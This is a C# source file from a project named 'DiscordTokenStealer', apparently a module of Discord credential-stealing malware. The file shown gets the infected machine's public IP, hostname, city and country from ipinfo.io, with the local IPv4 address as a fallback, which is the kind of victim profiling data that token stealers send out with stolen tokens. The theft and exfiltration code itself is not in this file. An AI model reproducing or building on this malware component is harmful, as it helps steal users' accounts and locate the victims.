using System.Net;
using System.Text.Json;
using System.Net.Sockets;
using System.Text.Json.Serialization;

namespace DiscordTokenStealer;
public static class IPInfo
{
    private static async Task<IPInformation?> GetIpInformation()
    {
        using HttpClient client = new(new HttpClientHandler { UseProxy = true, Proxy = new WebProxy() }, true);
        using HttpResponseMessage response = await client.GetAsync(new Uri("https://ipinfo.io/"));
        await using Stream json = await response.Content.ReadAsStreamAsync();
        return await JsonSerializer.DeserializeAsync<IPInformation>(json);
    }

    private static async Task<IPAddress> GetLocalIPv4()
    {
        return (await Dns.GetHostEntryAsync(Dns.GetHostName())).AddressList.First(address =>
            address.AddressFamily == AddressFamily.InterNetwork);
    }

    public static async Task<IPAddress> GetAddress(bool preferlocal = false)
    {
        IPAddress local = await GetLocalIPv4();
        if (!System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
        {
            return local;
        }
        IPInformation? info = await GetIpInformation();
        if (info == null || !IPAddress.TryParse(info.IP, out IPAddress? address))
        {
            return local;
        }
        return preferlocal ? local : address;
    }

    private class IPInformation
    {
        [JsonPropertyName("ip")] public string IP { get; set; }
        [JsonPropertyName("hostname")] public string Hostname { get; set; }
        [JsonPropertyName("city")] public string City { get; set; }
        [JsonPropertyName("country")] public string Country { get; set; }
    }
}